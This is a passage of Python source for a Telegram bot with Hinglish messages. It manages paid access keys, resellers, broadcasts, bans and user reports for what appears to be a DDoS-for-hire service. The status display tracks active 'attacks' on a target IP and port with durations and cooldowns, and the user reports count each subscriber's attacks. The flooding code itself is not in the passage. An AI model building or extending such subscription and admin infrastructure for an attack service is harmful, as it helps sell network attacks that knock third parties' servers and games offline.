        key = f"TRAIL-OWNER-{generate_key(10)}"
        key_doc = {
            'key': key,
            'duration_seconds': int(duration.total_seconds()),
            'duration_label': f"{duration_label} (Owner Trail)",
            'created_at': datetime.now(),
            'created_by': user_id,
            'created_by_type': 'owner_trail',
            'used': False,
            'used_by': None,
            'used_at': None,
            'max_users': 1,
            'is_trail': True
        }
        keys_collection.insert_one(key_doc)
        generated_keys.append(key)
    
    keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
    bot.reply_to(message, f"✅ {count} Owner Trail Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", parse_mode="HTML")

@bot.message_handler(commands=["user_resell"])
def user_resell_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /user_resell <id or @username>")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    keys = list(keys_collection.find({'created_by': reseller_id, 'used': True}))
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if not keys:
        bot.reply_to(message, f"📋 Reseller {display} ke koi users nahi hain!")
        return
    
    response = f"═══════════════════════════\n"
    response += f"👤 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 {display} 𝗨𝗦𝗘𝗥𝗦\n"
    response += "═══════════════════════════\n\n"
    
    for i, key in enumerate(keys[:15], 1):
        user = users_collection.find_one({'key': key['key']})
        if user:
            response += f"{i}. 👤 {user.get('username', 'Unknown')}\n"
            response += f"   📱 ID: {user['user_id']}\n"
            response += f"   🔑 Key: {key['key']}\n\n"
    
    response += f"═══════════════════════════\n"
    response += f"📊 Total Users: {len(keys)}\n"
    response += "═══════════════════════════"
    
    bot.reply_to(message, response)

pending_broadcast = {}
pending_broadcast_reseller = {}
_broadcast_lock = threading.Lock()

@bot.message_handler(commands=["broadcast_paid"])
def broadcast_paid_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /broadcast_paid <message>")
        return
    
    broadcast_msg = command_parts[1]
    
    # Find all users with active subscription
    now = datetime.now()
    active_subscribers = list(users_collection.find({'key_expiry': {'$gt': now}}))
    
    if not active_subscribers:
        bot.reply_to(message, "📋 Koi active subscribers nahi hain jinhe message bheja ja sake!")
        return
        
    sent_count = 0
    fail_count = 0
    
    progress_msg = bot.reply_to(message, f"📢 Broadcasting message to {len(active_subscribers)} paid users...")
    
    for user in active_subscribers:
        try:
            target_id = user['user_id']
            # Don't send to owner again if they are in the list
            if target_id == BOT_OWNER:
                continue
            bot.send_message(target_id, f"💎 𝗣𝗔𝗜𝗗 𝗨𝗦𝗘𝗥 𝗔𝗡𝗡𝗢𝗨𝗡𝗖𝗘𝗠𝗘𝗡𝗧\n\n{broadcast_msg}")
            sent_count += 1
            time.sleep(0.05) # Small delay to avoid rate limits
        except Exception:
            fail_count += 1
            
    bot.edit_message_text(
        f"✅ Broadcast Complete!\n\n👤 Sent to: {sent_count} paid users\n❌ Failed: {fail_count}",
        message.chat.id,
        progress_msg.message_id
    )

@bot.message_handler(commands=["broadcast"])
def broadcast_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    reply_msg = message.reply_to_message
    command_parts = message.text.split(maxsplit=1)
    
    if not reply_msg and len(command_parts) < 2:
        bot.reply_to(message, "⚠️ Usage:\n• /broadcast <message>\n• Ya kisi message ko reply karke /broadcast likho")
        return
    
    all_users = list(users_collection.find())
    all_resellers = list(resellers_collection.find())
    all_bot_users = list(bot_users_collection.find())
    
    all_user_ids = set()
    for u in all_users:
        all_user_ids.add(u['user_id'])
    for r in all_resellers:
        all_user_ids.add(r['user_id'])
    for bu in all_bot_users:
        all_user_ids.add(bu['user_id'])
    
    if reply_msg:
        pending_broadcast[user_id] = {'type': 'reply', 'message': reply_msg, 'users': all_user_ids}
        content_type = "Photo" if reply_msg.photo else "Video" if reply_msg.video else "Document" if reply_msg.document else "Poll" if reply_msg.poll else "Audio" if reply_msg.audio else "Sticker" if reply_msg.sticker else "Text"
        bot.reply_to(message, f"⚠️ Broadcast Confirmation\n\n📦 Content: {content_type}\n👥 Users: {len(all_user_ids)}\n\n✅ /confirm_broadcast - Bhejo\n❌ /cancel_broadcast - Cancel")
    else:
        broadcast_msg = command_parts[1]
        pending_broadcast[user_id] = {'type': 'text', 'message': broadcast_msg, 'users': all_user_ids}
        bot.reply_to(message, f"⚠️ Broadcast Confirmation\n\n📝 Message: {broadcast_msg[:100]}{'...' if len(broadcast_msg) > 100 else ''}\n👥 Users: {len(all_user_ids)}\n\n✅ /confirm_broadcast - Bhejo\n❌ /cancel_broadcast - Cancel")

@bot.message_handler(commands=["confirm_broadcast"])
def confirm_broadcast_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    if user_id not in pending_broadcast:
        bot.reply_to(message, "❌ Pehle /broadcast karo!")
        return
    
    data = pending_broadcast[user_id]
    del pending_broadcast[user_id]
    
    sent_count = 0
    failed_count = 0
    
    for uid in data['users']:
        try:
            if data['type'] == 'text':
                bot.send_message(uid, f"📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧\n\n{data['message']}")
            else:
                bot.copy_message(uid, data['message'].chat.id, data['message'].message_id)
            sent_count += 1
        except:
            failed_count += 1
    
    bot.reply_to(message, f"✅ Broadcast Sent!\n\n📨 Total: {len(data['users'])}\n✅ Delivered: {sent_count}\n❌ Failed: {failed_count}")

@bot.message_handler(commands=["cancel_broadcast"])
def cancel_broadcast_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    cancelled = False
    if user_id in pending_broadcast:
        del pending_broadcast[user_id]
        cancelled = True
    if user_id in pending_broadcast_reseller:
        del pending_broadcast_reseller[user_id]
        cancelled = True
    
    if cancelled:
        bot.reply_to(message, "❌ Broadcast cancelled!")
    else:
        bot.reply_to(message, "ℹ️ Koi pending broadcast nahi hai.")

@bot.message_handler(commands=["broadcast_reseller"])
def broadcast_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    reply_msg = message.reply_to_message
    command_parts = message.text.split(maxsplit=1)
    
    if not reply_msg and len(command_parts) < 2:
        bot.reply_to(message, "⚠️ Usage:\n• /broadcast_reseller <message>\n• Ya kisi message ko reply karke /broadcast_reseller likho")
        return
    
    resellers = list(resellers_collection.find())
    reseller_ids = set(r['user_id'] for r in resellers)
    
    if reply_msg:
        pending_broadcast_reseller[user_id] = {'type': 'reply', 'message': reply_msg, 'users': reseller_ids}
        content_type = "Photo" if reply_msg.photo else "Video" if reply_msg.video else "Document" if reply_msg.document else "Poll" if reply_msg.poll else "Audio" if reply_msg.audio else "Sticker" if reply_msg.sticker else "Text"
        bot.reply_to(message, f"⚠️ Reseller Broadcast Confirmation\n\n📦 Content: {content_type}\n👥 Resellers: {len(reseller_ids)}\n\n✅ /confirm_broadcast_reseller - Bhejo\n❌ /cancel_broadcast - Cancel")
    else:
        broadcast_msg = command_parts[1]
        pending_broadcast_reseller[user_id] = {'type': 'text', 'message': broadcast_msg, 'users': reseller_ids}
        bot.reply_to(message, f"⚠️ Reseller Broadcast Confirmation\n\n📝 Message: {broadcast_msg[:100]}{'...' if len(broadcast_msg) > 100 else ''}\n👥 Resellers: {len(reseller_ids)}\n\n✅ /confirm_broadcast_reseller - Bhejo\n❌ /cancel_broadcast - Cancel")

@bot.message_handler(commands=["confirm_broadcast_reseller"])
def confirm_broadcast_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    if user_id not in pending_broadcast_reseller:
        bot.reply_to(message, "❌ Pehle /broadcast_reseller karo!")
        return
    
    data = pending_broadcast_reseller[user_id]
    del pending_broadcast_reseller[user_id]
    
    sent_count = 0
    failed_count = 0
    
    for uid in data['users']:
        try:
            if data['type'] == 'text':
                bot.send_message(uid, f"📢 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗡𝗢𝗧𝗜𝗖𝗘\n\n{data['message']}")
            else:
                bot.copy_message(uid, data['message'].chat.id, data['message'].message_id)
            sent_count += 1
        except:
            failed_count += 1
    
    bot.reply_to(message, f"✅ Reseller Broadcast Sent!\n\n📨 Total: {len(data['users'])}\n✅ Delivered: {sent_count}\n❌ Failed: {failed_count}")

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /redeem <key>")
        return
    
    key_input = command_parts[1]
    
    key_doc = keys_collection.find_one({'key': key_input})
    
    if not key_doc:
        bot.reply_to(message, "❌ Invalid key!")
        return
    
    max_users = key_doc.get('max_users', 1)
    current_users = key_doc.get('current_users', 0)
    
    if key_doc['used'] and current_users >= max_users:
        bot.reply_to(message, "❌ Ye key pehle se use ho chuki hai!")
        return
    
    # Trail key check: Cannot extend existing active subscription
    if key_doc.get('is_trail'):
        user_data = users_collection.find_one({'user_id': user_id})
        if user_data and user_data.get('key_expiry') and user_data['key_expiry'] > datetime.now():
            # Trail abuse tracking
            abuse_count = user_data.get('trail_abuse_count', 0) + 1
            users_collection.update_one({'user_id': user_id}, {'$set': {'trail_abuse_count': abuse_count}})
            
            if abuse_count == 1:
                bot.reply_to(message, "⚠️ Warning: Aap trail key se apna time extend nahi kar sakte! Dobara koshish karne par ban mil sakta hai.")
            else:
                ban_minutes = 10 * (2 ** (abuse_count - 2)) # 10m, 20m, 40m...
                ban_expiry = datetime.now() + timedelta(minutes=ban_minutes)
                users_collection.update_one(
                    {'user_id': user_id},
                    {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}}
                )
                bot.reply_to(message, f"🚫 Trail key abuse ki wajah se aapko {ban_minutes} minutes ke liye ban kar diya gaya hai!")
            return

    user = users_collection.find_one({'user_id': user_id})
    
    reseller_username = key_doc.get('created_by_username') if key_doc.get('created_by_type') == 'reseller' else None
    
    if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + timedelta(seconds=key_doc['duration_seconds'])
        
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'key': key_input,
                'key_expiry': new_expiry,
                'key_duration_seconds': key_doc['duration_seconds'],
                'key_duration_label': key_doc['duration_label'],
                'redeemed_at': datetime.now(),
                'reseller_username': reseller_username
            }}
        )
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}}
            )
        else:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}}
            )
        
        new_remaining = get_time_remaining(user_id)
        bot.reply_to(message, f"✅ Key Extended!\n\n🔑 Key: `{key_input}`\n⏰ Added: {key_doc['duration_label']}\n⏳ Total Time: {new_remaining}", parse_mode="Markdown")
    else:
        expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
        
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'user_id': user_id,
                'username': user_name,
                'key': key_input,
                'key_expiry': expiry_time,
                'key_duration_seconds': key_doc['duration_seconds'],
                'key_duration_label': key_doc['duration_label'],
                'redeemed_at': datetime.now(),
                'reseller_username': reseller_username
            }},
            upsert=True
        )
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}}
            )
        else:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}}
            )
        
        remaining = get_time_remaining(user_id)
        bot.reply_to(message, f"✅ Key Redeemed!\n\n🔑 Key: `{key_input}`\n⏰ Duration: {key_doc['duration_label']}\n⏳ Time Left: {remaining}", parse_mode="Markdown")

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key'):
        bot.reply_to(message, "❌ Tumhare paas koi key nahi hai!")
        return
    
    if not has_valid_key(user_id):
        reseller_username = user.get('reseller_username')
        if reseller_username:
            bot.reply_to(message, f"❌ Key khatam ho gayi!\n\n🔄 Renew ke liye apne seller ko DM karo", parse_mode="Markdown")
        else:
            bot.reply_to(message, "❌ Key khatam ho gayi!")
        return
    
    remaining = get_time_remaining(user_id)
    
    bot.reply_to(message, f"🔑 Key Details\n\n📌 Key: `{user['key']}`\n⏳ Remaining: {remaining}\n✅ Status: Active", parse_mode="Markdown")

def build_status_message(user_id):
    get_active_attack_count()
    cooldown = get_user_cooldown(user_id)
    
    # Always show all attacks
    user_attacks = {k: v for k, v in active_attacks.items()}
    user_attack_count = len(user_attacks)
    
    response = "╔══════════════════════════╗\n"
    response += f"║  🔥 ATTACK STATUS  🔥       ║\n"
    response += "╠══════════════════════════╣\n"
    response += f"║  📊 Total Active: {user_attack_count}               ║\n"
    response += "╚══════════════════════════╝\n"
    
    if user_attacks:
        for attack_id, attack_info in list(user_attacks.items()):
            remaining = (attack_info['end_time'] - datetime.now()).total_seconds()
            if remaining > 0:
                total = attack_info['duration']
                elapsed = total - remaining
                percent = int((elapsed / total) * 100)
                
                filled = int(percent / 10)
                empty = 10 - filled
                bar = "🟢" * filled + "⚫" * empty
                
                response += f"\n┌─────────────────────────┐\n"
                response += f"│ 🎯 {attack_info['target']}:{attack_info['port']}\n"
                response += f"│ ⏱️ {int(remaining)}s remaining\n"
                response += f"│ {bar} {percent}%\n"
                response += f"└─────────────────────────┘\n"
    else:
        response += "\n💤 Koi active attack nahi\n"
    
    response += f"\n⚙️ Max Time: {get_max_attack_time()}s"
    
    if cooldown > 0:
        response += f"\n⏳ Cooldown: {cooldown}s"
    
    return response

def update_status_loop(chat_id, message_id, user_id):
    try:
        for _ in range(30):
            time.sleep(2)
            if not active_attacks:
                break
            new_response = build_status_message(user_id)
            try:
                bot.edit_message_text(new_response, chat_id=chat_id, message_id=message_id)
            except:
                break
    except:
        pass

@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not has_valid_key(user_id) and not is_owner(user_id):
        bot.reply_to(message, "❌ Pehle key purchase karo!")
        return
        
    response = build_status_message(user_id)
    sent_msg = bot.reply_to(message, response)
    
    if active_attacks:
        thread = threading.Thread(target=update_status_loop, args=(sent_msg.chat.id, sent_msg.message_id, user_id))
        thread.daemon = True
        thread.start()

@bot.message_handler(commands=["extend"])
def extend_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /extend <id or @username> <time>")
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        bot.reply_to(message, "❌ Invalid duration!")
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    
    if not user:
        bot.reply_to(message, "❌ User key database mein nahi mila!")
        return
    
    if user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + duration
    else:
        new_expiry = datetime.now() + duration
    
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'key_expiry': new_expiry}}
    )
    
    new_remaining = format_timedelta(new_expiry - datetime.now())
    
    try:
        bot.send_message(target_user_id, f"🎉 Time Extended!\n\n⏰ Added: {duration_label}\n⏳ Total Time: {new_remaining}\n\nEnjoy!")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    bot.reply_to(message, f"✅ Time Extended!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n⏰ Added: {duration_label}\n⏳ New Time: {new_remaining}")

@bot.message_handler(commands=["extend_all"])
def extend_all_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /extend_all <time>")
        return
    
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        bot.reply_to(message, "❌ Invalid duration!")
        return
    
    # Get all users who have an assigned key
    all_users = list(users_collection.find({'key': {'$ne': None}}))
    
    if not all_users:
        bot.reply_to(message, "❌ Koi user nahi hai jinke paas key ho!")
        return
    
    extended_count = 0
    notified_count = 0
    
    for user in all_users:
        uid = user['user_id']
        old_expiry = user.get('key_expiry')
        
        # Logic: If expired, start from now. If active, add to existing expiry.
        if old_expiry and old_expiry > datetime.now():
            new_expiry = old_expiry + duration
        else:
            new_expiry = datetime.now() + duration
            
        users_collection.update_one(
            {'user_id': uid},
            {'$set': {'key_expiry': new_expiry}}
        )
        extended_count += 1
        
        try:
            bot.send_message(uid, f"🎉 Time Extended for ALL Users!\n\n⏰ Added: {duration_label}\n\nEnjoy!")
            notified_count += 1
        except:
            pass
            
    bot.reply_to(message, f"✅ Done! Sabka time extend ho gaya.\n\n👤 Total Users: {extended_count}\n📨 Notified: {notified_count}\n⏰ Added: {duration_label}")

@bot.message_handler(commands=["down"])
def down_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /down <id or @username> <time>")
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        bot.reply_to(message, "❌ Invalid duration!")
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    
    if not user:
        bot.reply_to(message, "❌ User key database mein nahi mila!")
        return
    
    if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
        bot.reply_to(message, "❌ User ke paas active key nahi hai!")
        return
    
    new_expiry = user['key_expiry'] - duration
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    
    if new_expiry <= datetime.now():
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key': None, 'key_expiry': None}}
        )
        bot.reply_to(message, f"⚠️ Key Expired!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n❌ Key removed!")
    else:
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key_expiry': new_expiry}}
        )
        new_remaining = format_timedelta(new_expiry - datetime.now())
        bot.reply_to(message, f"✅ Time Reduced!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n⏰ Reduced: {duration_label}\n⏳ New Time: {new_remaining}")

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /delkey <key>")
        return
    
    key_input = command_parts[1]
    
    result = keys_collection.delete_one({'key': key_input})
    
    if result.deleted_count > 0:
        users_collection.update_one({'key': key_input}, {'$set': {'key': None, 'key_expiry': None}})
        bot.reply_to(message, f"✅ Key `{key_input}` deleted!", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Key nahi mili!")

@bot.message_handler(commands=["key"])
def key_details_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /key <key>")
        return
    
    key_input = command_parts[1]
    
    key_doc = keys_collection.find_one({'key': key_input})
    
    if not key_doc:
        bot.reply_to(message, "❌ Key nahi mili!")
        return
    
    response = "═══════════════════════════\n"
    response += "🔑 𝗞𝗘𝗬 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n"
    response += "═══════════════════════════\n\n"
    
    response += f"🔑 Key: {key_input}\n"
    response += f"⏰ Duration: {key_doc.get('duration_label', 'Unknown')}\n"
    response += f"⏱️ Seconds: {key_doc.get('duration_seconds', 0)}\n"
    response += f"📅 Created: {key_doc.get('created_at', 'Unknown')}\n"
    
    creator_type = key_doc.get('created_by_type', 'owner')
    if creator_type == 'reseller':
        creator = key_doc.get('created_by_username', str(key_doc.get('created_by', 'Unknown')))
        response += f"👤 Creator: {creator} (Reseller)\n"
    else:
        response += f"👤 Creator: OWNER\n"
    
    response += f"\n📊 Status: {'🔴 USED' if key_doc.get('used') else '🟢 UNUSED'}\n"
    
    if key_doc.get('used'):
        response += f"👤 Used By: {key_doc.get('used_by', 'Unknown')}\n"
        response += f"📅 Used At: {key_doc.get('used_at', 'Unknown')}\n"
        
        user = users_collection.find_one({'key': key_input})
        if user:
            response += f"\n─── 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢 ───\n"
            response += f"👤 Username: {user.get('username', 'Unknown')}\n"
            response += f"🆔 User ID: {user.get('user_id', 'Unknown')}\n"
            
            expiry = user.get('key_expiry')
            if expiry:
                if expiry > datetime.now():
                    remaining = format_timedelta(expiry - datetime.now())
                    response += f"⏳ Remaining: {remaining}\n"
                    response += f"✅ Status: ACTIVE\n"
                else:
                    response += f"❌ Status: EXPIRED\n"
    
    response += "\n═══════════════════════════"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=["allkeys"])
def list_keys_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    unused_keys = list(keys_collection.find({'used': False}))
    used_keys = list(keys_collection.find({'used': True}).sort('used_at', -1))
    
    content = "═══════════════════════════\n"
    content += "       ALL KEYS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    
    content += f"🟢 UNUSED KEYS ({len(unused_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(unused_keys, 1):
        content += f"{i}. {key['key']}\n"
        content += f"   Duration: {key.get('duration_label', 'N/A')}\n"
        content += f"   Created: {key.get('created_at', 'N/A')}\n"
        if key.get('created_by_username'):
            content += f"   By: {key.get('created_by_username')}\n"
        content += "\n"
    
    if not unused_keys:
        content += "   No unused keys\n\n"
    
    content += f"\n🔴 USED KEYS ({len(used_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(used_keys, 1):
        content += f"{i}. {key['key']}\n"
        content += f"   Duration: {key.get('duration_label', 'N/A')}\n"
        content += f"   Used by: {key.get('used_by', 'N/A')}\n"
        if key.get('used_at'):
            content += f"   Used at: {key['used_at'].strftime('%d-%m-%Y %H:%M')}\n"
        if key.get('created_by_username'):
            content += f"   Created by: {key.get('created_by_username')}\n"
        content += "\n"
    
    if not used_keys:
        content += "   No used keys\n"
    
    content += "\n═══════════════════════════\n"
    content += f"TOTAL: {len(unused_keys)} unused | {len(used_keys)} used\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    bot.send_document(message.chat.id, file, caption=f"📋 All Keys Report\n\n🟢 Unused: {len(unused_keys)}\n🔴 Used: {len(used_keys)}")

@bot.message_handler(commands=["allusers"])
def all_users_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    all_users = list(users_collection.find({'key': {'$ne': None}}).sort('key_expiry', -1))
    
    if not all_users:
        bot.reply_to(message, "📋 Koi user nahi hai!")
        return
    
    active_users = []
    expired_users = []
    
    for user in all_users:
        if user.get('key_expiry') and user['key_expiry'] > datetime.now():
            active_users.append(user)
        else:
            expired_users.append(user)
    
    content = "═══════════════════════════\n"
    content += "       ALL USERS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    
    content += f"🟢 ACTIVE USERS ({len(active_users)})\n"
    content += "───────────────────────────\n"
    
    for i, user in enumerate(active_users, 1):
        remaining = user['key_expiry'] - datetime.now()
        days = remaining.days
        hours, remainder = divmod(remaining.seconds, 3600)
        minutes, _ = divmod(remainder, 60)
        time_str = f"{days}d {hours}h {minutes}m"
        
        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        
        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   ID: {user['user_id']}\n"
        content += f"   Key: {user.get('key', 'N/A')}\n"
        content += f"   Duration: {user.get('key_duration_label', 'N/A')}\n"
        content += f"   Time Left: {time_str}\n"
        content += f"   Expires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   Total Attacks: {attack_count}\n"
        if user.get('reseller_username'):
            content += f"   Reseller: @{user['reseller_username']}\n"
        content += "\n"
    
    if not active_users:
        content += "   No active users\n\n"
    
    content += f"\n🔴 EXPIRED USERS ({len(expired_users)})\n"
    content += "───────────────────────────\n"
    
    for i, user in enumerate(expired_users, 1):
        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   ID: {user['user_id']}\n"
        content += f"   Key: {user.get('key', 'N/A')}\n"
        if user.get('key_expiry'):
            content += f"   Expired: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   Total Attacks: {attack_count}\n"
        content += "\n"
    
    if not expired_users:
        content += "   No expired users\n"
    
    content += "\n═══════════════════════════\n"
    content += f"TOTAL: {len(active_users)} Active | {len(expired_users)} Expired\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    bot.send_document(message.chat.id, file, caption=f"👥 All Users Report\n\n🟢 Active: {len(active_users)}\n🔴 Expired: {len(expired_users)}")

pending_del_exp = {}
pending_del_exp_key = {}

@bot.message_handler(commands=["del_exp_usr"])
def del_exp_usr_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    all_users = list(users_collection.find({'key': {'$ne': None}}))
    expired_users = []
    
    for user in all_users:
        if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
            expired_users.append(user)
    
    if not expired_users:
        bot.reply_to(message, "✅ Koi expired user nahi hai!")
        return
    
    pending_del_exp[user_id] = expired_users
    
    bot.reply_to(message, f"⚠️ {len(expired_users)} expired users milein!\n\nConfirm karne ke liye /confirm_del_exp likho.\nCancel karne ke liye /cancel_del likho.")

@bot.message_handler(commands=["confirm_del_exp"])
def confirm_del_exp_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    if user_id not in pending_del_exp:
        bot.reply_to(message, "❌ Pehle /del_exp_usr karo!")
        return
    
    expired_users = pending_del_exp[user_id]
    del pending_del_exp[user_id]
    
    deleted_count = 0
    for user in expired_users:
        try:
            users_collection.delete_one({'user_id': user['user_id']})
            deleted_count += 1
        except:
            pass
    
    bot.reply_to(message, f"✅ {deleted_count} expired users delete ho gaye!")

@bot.message_handler(commands=["cancel_del"])
def cancel_del_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    cancelled = False
    if user_id in pending_del_exp:
        del pending_del_exp[user_id]
        cancelled = True
    if user_id in pending_del_exp_key:
        del pending_del_exp_key[user_id]
        cancelled = True
    
    if cancelled:
        bot.reply_to(message, "❌ Delete operation cancelled!")
    else:
        bot.reply_to(message, "ℹ️ Koi pending delete nahi hai.")

@bot.message_handler(commands=["del_exp_key"])
def del_exp_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    all_used_keys = list(keys_collection.find({'used': True}))
    expired_keys = []
    
    for key in all_used_keys:
        user = users_collection.find_one({'key': key['key']})
        if user:
            if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
                expired_keys.append(key)
        else:
            expired_keys.append(key)
    
    if not expired_keys:
        bot.reply_to(message, "✅ Koi expired key nahi hai!")
        return
    
    pending_del_exp_key[user_id] = expired_keys
    
    bot.reply_to(message, f"⚠️ {len(expired_keys)} expired keys milein!\n\nConfirm karne ke liye /confirm_del_exp_key likho.\nCancel karne ke liye /cancel_del likho.")

@bot.message_handler(commands=["confirm_del_exp_key"])
def confirm_del_exp_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    if user_id not in pending_del_exp_key:
        bot.reply_to(message, "❌ Pehle /del_exp_key karo!")
        return
    
    expired_keys = pending_del_exp_key[user_id]
    del pending_del_exp_key[user_id]
    
    deleted_count = 0
    for key in expired_keys:
        try:
            keys_collection.delete_one({'key': key['key']})
            deleted_count += 1
